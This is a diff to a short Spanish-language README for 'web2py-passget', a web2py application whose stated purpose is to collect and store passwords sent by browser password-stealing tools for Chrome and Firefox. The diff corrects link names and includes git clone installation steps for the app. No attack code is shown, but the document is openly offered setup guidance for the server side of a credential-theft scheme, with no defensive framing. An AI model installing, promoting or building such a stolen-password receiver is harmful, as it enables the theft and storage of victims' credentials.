@@ -1,10 +1,10 @@
 # web2py-passget
-Aplicación web2py que tiene como objetivo almacenar las contraseñas enviadas por [chrome-pass-stealer](https://github.com/sh4r3m4n/chrome-pass-stealer) y [chrome-pass-stealer](https://github.com/sh4r3m4n/chrome-pass-stealer).
+Aplicación web2py que tiene como objetivo almacenar las contraseñas enviadas por [chrome-pass-stealer](https://github.com/sh4r3m4n/chrome-pass-stealer) y [firefox-pass-stealer](https://github.com/sh4r3m4n/firefox-pass-stealer).
 ### Instalación
 ```
 cd ~/web2py # Donde tenemos web2py
 cd applications
-git clone https://github.com/sh4r3m4n/webpy-passget.git
+git clone https://github.com/sh4r3m4n/web2py-passget.git
 mv web2py-passget passget
 ```
 
